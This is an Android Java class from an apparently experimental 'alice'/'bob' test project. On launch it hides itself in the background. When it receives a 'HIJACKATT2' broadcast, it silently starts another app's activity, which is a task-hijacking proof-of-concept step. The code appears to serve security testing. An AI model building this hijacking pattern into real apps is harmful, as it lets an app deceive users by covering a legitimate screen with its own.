package com.projects.alice.Attack2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import com.projects.alice.R;

public class A2_Attack2 extends AppCompatActivity {

    private BroadcastReceiver br;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        moveTaskToBack(true);
        overridePendingTransition(0, 0);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_a2__attack2);

        br = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Intent startB2 = new Intent();
                startB2.setAction("com.projects.bob.STARTB2ATT2");
                startB2.setFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                try{
                    startActivity(startB2);
                } catch (ActivityNotFoundException ex){
                    //TODO: Activity not found, not all test apps installed
                }
            }
        };

        IntentFilter filter = new IntentFilter("com.projects.alice.HIJACKATT2");
        registerReceiver(br, filter);
        //TODO: Create broadcast receiver to start b2
    }
}
